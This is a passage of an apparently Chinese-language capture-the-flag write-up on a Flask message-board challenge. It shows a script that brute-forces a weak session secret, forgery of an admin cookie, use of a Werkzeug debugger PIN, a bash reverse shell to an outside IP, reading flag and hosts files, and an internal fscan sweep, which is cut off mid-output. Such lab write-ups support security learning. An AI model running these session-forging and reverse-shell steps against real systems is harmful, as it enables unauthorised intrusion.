&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[12:46:15] 200 -  966B  - &#x2F;register 
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;可以得到该站点存在以下路径可以访问&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&#x2F;change&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&#x2F;console - Werkzeug Debugger&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&#x2F;index&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&#x2F;login&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&#x2F;logout&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&#x2F;register&lt;&#x2F;p&gt;
&lt;p&gt;通过随便注册一个账号可以发现如下内容&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;admin
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;2023-08-01 19:22:07
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;记录一下搭建留言板的过程
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;首先确定好web框架，笔者选择使用简单的flask框架。
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;然后使用强且随机的字符串作为session的密钥。
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;app.secret_key = &amp;quot;This-random-secretKey-you-can&amp;#39;t-get&amp;quot; + os.urandom(2).hex()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;最后再写一下路由和数据库处理的函数就完成啦！！
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;身为web手的我为了保护好服务器，写代码的时候十分谨慎，一定不会让有心人有可乘之机！
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;在 Header - Cookie 可以看到以下内容&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Cookie: session=eyJwb3dlciI6Imd1ZXN0IiwidXNlciI6IjEyMzM0NSJ9.ZO8JIQ.2Fe5uGvbCEcDs3iqMVW0vYhB4hQ
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;访问 &lt;code&gt;&#x2F;console&lt;&#x2F;code&gt; 可以发现是一个 Werkzeug Debugger 但是需要 PIN 才能解开，给了 &lt;code&gt;app.secret_key&lt;&#x2F;code&gt; 的 Hint 那就先试试伪造 Session 吧。&lt;&#x2F;p&gt;
&lt;h4 id=&quot;0x01-flask-session-wei-zao&quot;&gt;0x01 Flask Session 伪造&lt;a class=&quot;zola-anchor&quot; href=&quot;#0x01-flask-session-wei-zao&quot; aria-label=&quot;Anchor link for: 0x01-flask-session-wei-zao&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h4&gt;
&lt;blockquote&gt;
&lt;p&gt;https:&#x2F;&#x2F;github.com&#x2F;noraj&#x2F;flask-session-cookie-manager&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;通过分析 secret_key 的生成方式可以得知只需要猜出 &lt;code&gt;os.urandom(2).hex()&lt;&#x2F;code&gt; 生成的随机值就行，这个随机值的范围是 &lt;code&gt;0000-ffff&lt;&#x2F;code&gt; （通过本地输出该函数发现是小写字母），通过结合 &lt;code&gt;flask-session-cookie-manager3.py&lt;&#x2F;code&gt; 编写一个脚本进行爆破。&lt;&#x2F;p&gt;
&lt;p&gt;通过上方的抓包获取到的 Session 用 &lt;code&gt;flask-session-cookie-manager3.py&lt;&#x2F;code&gt; 进行 decode 可以得到结构如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;{
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    &amp;quot;power&amp;quot;: &amp;quot;guest&amp;quot;,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    &amp;quot;user&amp;quot;: &amp;quot;123345&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;也可以通过 https:&#x2F;&#x2F;www.kirsle.net&#x2F;wizards&#x2F;flask-session.cgi 在线 Decode。&lt;&#x2F;p&gt;
&lt;p&gt;使用脚本前需要修改脚本中 &lt;code&gt;session&lt;&#x2F;code&gt; 的 &lt;code&gt;user&lt;&#x2F;code&gt; 值，确保当前用户存在（&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;import os
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;import requests
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;import itertools
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;from itsdangerous import base64_decode
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;import ast
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;from flask.sessions import SecureCookieSessionInterface
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;class MockApp(object):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    def __init__(self, secret_key):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        self.secret_key = secret_key
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;class FSCM():
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    @staticmethod
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    def encode(secret_key, session_cookie_structure):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        try:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            app = MockApp(secret_key)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            si = SecureCookieSessionInterface()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            s = si.get_signing_serializer(app)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            return s.dumps(session_cookie_structure)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        except Exception as e:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            return &amp;quot;[Encoding error] {}&amp;quot;.format(e)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            raise e
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    @staticmethod
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    def decode(session_cookie_value, secret_key=None):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        try:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            if secret_key is None:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                compressed = False
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                payload = session_cookie_value
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                if payload.startswith(&amp;#39;.&amp;#39;):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                    compressed = True
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                    payload = payload[1:]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                data = payload.split(&amp;quot;.&amp;quot;)[0]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                data = base64_decode(data)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                if compressed:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                    data = zlib.decompress(data)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                return data
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            else:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                app = MockApp(secret_key)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                si = SecureCookieSessionInterface()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                s = si.get_signing_serializer(app)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                return s.loads(session_cookie_value)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        except Exception as e:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            return &amp;quot;[Decoding error] {}&amp;quot;.format(e)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            raise e
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;def test_key(randomHex):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    print(randomHex)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    session = FSCM.encode(&amp;quot;This-random-secretKey-you-can&amp;#39;t-get{0}&amp;quot;.format(randomHex), &amp;#39;{&amp;quot;power&amp;quot;: &amp;quot;guest&amp;quot;,&amp;quot;user&amp;quot;: &amp;quot;fdasfdsa&amp;quot;}&amp;#39;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    headers = {&amp;quot;Cookie&amp;quot;: f&amp;quot;session={session}&amp;quot;}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    data = {&amp;#39;message&amp;#39;: &amp;#39;test&amp;#39;}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    ret = requests.post(&amp;#39;http:&#x2F;&#x2F;47.115.201.35:8000&amp;#39;, headers=headers, data=data)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    print(ret.status_code)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    print(session)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    print(&amp;#39;=========&amp;#39;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    if &amp;#39;upload successfully&amp;#39; in ret.text:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        return (randomHex, session, ret.text)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    return None
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;hex_digits = &amp;#39;0123456789ABCDEF&amp;#39;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;combinations = [&amp;#39;&amp;#39;.join(comb).lower() for comb in itertools.product(hex_digits, repeat=4)]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;for combination in combinations:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    result = test_key(combination)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    if result:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        print(result[0])
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        print(result[1])
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        print(result[2])
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        break
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;quot;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;06f0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eyJwb3dlciI6Imd1ZXN0IiwidXNlciI6ImZkYXNmZHNhIn0.ZO7ASA.7z7ikCoBWPTz0iyHgPENP_TTvQw
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;lt;script&amp;gt;alert(&amp;quot;upload successfully&amp;quot;);window.location.href=&amp;quot;&#x2F;index&amp;quot;;&amp;lt;&#x2F;script&amp;gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;quot;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;因此可以得到 &lt;code&gt;os.urandom(2).hex()&lt;&#x2F;code&gt; 生成的值为 &lt;code&gt;06f0&lt;&#x2F;code&gt; ，&lt;code&gt;secret_key&lt;&#x2F;code&gt; 的值也就是 &lt;code&gt;This-random-secretKey-you-can&#x27;t-get06f0&lt;&#x2F;code&gt; 。&lt;&#x2F;p&gt;
&lt;p&gt;通过 flask-session-cookie-manager 进行 encode 就可以进行 Session 伪造成 admin 了，具体操作如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$ python flask_session_cookie_manager3.py encode -t &amp;#39;{\&amp;quot;power\&amp;quot;: \&amp;quot;admin\&amp;quot;,\&amp;quot;user\&amp;quot;: \&amp;quot;admin\&amp;quot;}&amp;#39; -s &amp;quot;This-random-secretKey-you-can&amp;#39;t-get06f0&amp;quot; 
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eyJwb3dlciI6ImFkbWluIiwidXNlciI6ImFkbWluIn0.ZO7MYg.HmVA8P4WT3h5qsDKMvAES1OwmJI
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;通过 BurpSuite 修改下 Cookie 中的 Session 就可以伪装成 admin 用户了，通过访问就可以得到以下内容。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;writeup.owo.show&#x2F;~gitbook&#x2F;image?url=https%3A%2F%2F1538376902-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FP93uXUpqRmANvc0oiUrO%252Fuploads%252FBo5Sb8TlmObMLHcy5ofk%252Fmoeworld-1.png%3Falt%3Dmedia%26token%3Dfa1fa01c-8d4c-4bde-905e-ffe46b4723f0&amp;amp;width=768&amp;amp;dpr=4&amp;amp;quality=100&amp;amp;sign=b18757aa1ea9220d1ff51bb7bf695760eabad055a5af97821f63d0b37957ef3a&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;可以得到 PIN 码是 &lt;code&gt;904-474-531&lt;&#x2F;code&gt; ，那下一步就是去获取 Console&lt;&#x2F;p&gt;
&lt;h4 id=&quot;0x02-huo-qu-console&quot;&gt;0x02 获取 Console&lt;a class=&quot;zola-anchor&quot; href=&quot;#0x02-huo-qu-console&quot; aria-label=&quot;Anchor link for: 0x02-huo-qu-console&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h4&gt;
&lt;p&gt;在 &lt;code&gt;&#x2F;console&lt;&#x2F;code&gt; 页面输入 PIN 码后即可使用控制台，可以通过 Console 来反弹 Shell，可以选择在自己服务器上搭建一个 &lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;ehang-io&#x2F;nps&quot;&gt;nps&lt;&#x2F;a&gt; ，可以看看 &lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;ehang-io.github.io&#x2F;nps&#x2F;#&#x2F;install&quot;&gt;官方文档&lt;&#x2F;a&gt; 。安装完成后在 Linux 装上客户端，通过服务端的 &lt;code&gt;客户端 - 新增&lt;&#x2F;code&gt; 后生成的唯一验证密钥（Unique verify Key）进行连接，具体方法如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$ .&#x2F;npc -server=&amp;lt;nsp服务端 IP&amp;gt;:8024 -vkey=&amp;lt;Unique verify Key&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;如果服务器带了防火墙的，务必记得去开放端口，为了安全推荐使用不常用端口并限制源。&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;连接后，先进行一个端口监听。&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;nc -lvvp 2333
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;然后在 Console 进行反弹 Shell，具体如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print(os.system(&amp;quot;bash -c &amp;#39;bash -i &amp;gt;&amp;amp; &#x2F;dev&#x2F;tcp&#x2F;20.2.216.21&#x2F;2333 0&amp;gt;&amp;amp;1&amp;#39;&amp;quot;))
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;就可以获得留言板所在容器的 Shell 了，通过题目描述中的内容，获取 &lt;code&gt;readme&lt;&#x2F;code&gt; 的内容，&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;root@66ff0435ac92:&#x2F;app# cat &#x2F;readme
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;cat &#x2F;readme
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;恭喜你通过外网渗透拿下了本台服务器的权限
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;接下来，你需要尝试内网渗透，本服务器的&#x2F;app&#x2F;tools目录下内置了fscan
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;你需要了解它的基本用法，然后扫描内网的ip段
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;如果你进行了正确的操作，会得到类似下面的结果
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;10.1.11.11:22 open
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;10.1.23.21:8080 open
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;10.1.23.23:9000 open
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;将你得到的若干个端口号从小到大排序并以 - 分割，这一串即为hint.zip压缩包的密码（本例中，密码为：22-8080-9000）
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;注意：请忽略掉xx.xx.xx.1，例如扫出三个ip 192.168.0.1 192.168.0.2 192.168.0.3 ，请忽略掉有关192.168.0.1的所有结果！此为出题人服务器上的其它正常服务
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;对密码有疑问随时咨询出题人
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;之后还可以获取 &lt;code&gt;flag&lt;&#x2F;code&gt; 的内容，&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;root@66ff0435ac92:&#x2F;app# cat &#x2F;flag
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;cat &#x2F;flag
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Oh! You discovered the secret of my blog.
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;But I divided the flag into three sections,hahaha.
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;This is the first part of the flag
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;moectf{Information-leakage-Is-dangerous!
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;下一步的操作就是扫内网 IP 段了。&lt;&#x2F;p&gt;
&lt;h4 id=&quot;0x03-huo-qu-ya-suo-bao-mi-ma&quot;&gt;0x03 获取压缩包密码&lt;a class=&quot;zola-anchor&quot; href=&quot;#0x03-huo-qu-ya-suo-bao-mi-ma&quot; aria-label=&quot;Anchor link for: 0x03-huo-qu-ya-suo-bao-mi-ma&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h4&gt;
&lt;p&gt;通过获取 hosts 内容可以得到以下内容&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;root@66ff0435ac92:&#x2F;app# cat &#x2F;etc&#x2F;hosts
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;cat &#x2F;etc&#x2F;hosts
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;127.0.0.1       localhost
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;::1     localhost ip6-localhost ip6-loopback
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;fe00::0 ip6-localnet
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;ff00::0 ip6-mcastprefix
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;ff02::1 ip6-allnodes
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;ff02::2 ip6-allrouters
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;172.20.0.4      66ff0435ac92
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;172.21.0.2      66ff0435ac92
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;可以得到存在另外两个 IP &lt;code&gt;172.20.0.4&lt;&#x2F;code&gt; 和 &lt;code&gt;172.21.0.2&lt;&#x2F;code&gt; 。&lt;&#x2F;p&gt;
&lt;p&gt;通过对这两个 IP 进行扫描可以得到以下内容&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;root@66ff0435ac92:&#x2F;app# &#x2F;app&#x2F;tools&#x2F;fscan -h 172.21.0.2&#x2F;16
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&#x2F;app&#x2F;tools&#x2F;fscan -h 172.21.0.2&#x2F;16
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;start infoscan
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(icmp) Target 172.21.0.1      is alive
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(icmp) Target 172.21.0.2      is alive
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[*] LiveTop 172.21.0.0&#x2F;16    段存活数量为: 2
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[*] LiveTop 172.21.0.0&#x2F;24    段存活数量为: 2
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[*] Icmp alive hosts len is: 2
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;172.21.0.1:8000 open
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;172.21.0.1:888 open
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;172.21.0.1:8080 open
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;172.21.0.2:8080 open
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;172.21.0.1:3306 open
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;172.21.0.1:443 open
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;172.21.0.1:80 open
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;172.21.0.1:22 open
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;172.21.0.1:21 open
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;172.21.0.1:7777 open
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;172.21.0.1:10001 open
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[*] alive ports len is: 11
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;start vulscan
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[*] WebTitle: http:&#x2F;&#x2F;172.21.0.1:888     code:403 len:548    title:403 Forbidden
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[*] WebTitle: http:&#x2F;&#x2F;172.21.0.1:8080    code:302 len:35     title:None 跳转url: http:&#x2F;&#x2F;172.21.0.1:8080&#x2F;login&#x2F;index
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[*] WebTitle: http:&#x2F;&#x2F;172.21.0.1:8000    code:302 len:199    title:Redirecting... 跳转url: http:&#x2F;&#x2F;172.21.0.1:8000&#x2F;login
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[*] WebTitle: http:&#x2F;&#x2F;172.21.0.1         code:200 len:138    title:404 Not Found
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[*] WebTitle: http:&#x2F;&#x2F;172.21.0.2:8080    code:302 len:199    title:Redirecting... 跳转url: http:&#x2F;&#x2F;172.21.0.2:8080&#x2F;login
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[*] WebTitle: http:&#x2F;&#x2F;172.21.0.1:7777    code:200 len:917    title:恭喜，站点创建成功！
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[*] WebTitle: http:&#x2F;&#x2F;172.21.0.1:8000&#x2F;login code:200 len:1145   title:LOGIN
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[*] WebTitle: http:&#x2F;&#x2F;172.21.0.1:8080&#x2F;login&#x2F;index code:200 len:3617   title:None
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[*] WebTitle: http:&#x2F;&#x2F;172.21.0.2:8080&#x2F;login code:200 len:1145   title:LOGIN
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
